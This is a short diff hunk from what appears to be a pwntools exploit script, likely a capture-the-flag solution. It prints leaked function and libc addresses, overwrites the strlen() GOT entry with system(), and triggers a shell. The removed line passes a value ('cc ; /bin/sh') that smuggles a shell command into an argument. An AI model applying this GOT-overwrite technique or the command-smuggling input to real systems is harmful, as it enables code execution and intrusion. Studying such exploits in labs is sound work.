@@ -77,7 +77,7 @@ log.info('func: 0x%012x' % func)
 log.info('libc: 0x%012x' % libc)
 
 # step 5: overwrite strlen() pointer in GOT with system()
-edit('cc ; /bin/sh', 'C'*46, p64(libc+SYS), 234)
+edit('cc', 'C'*46, p64(libc+SYS), 234)
 
 # step 6: pop shell
 io.sendline('add')
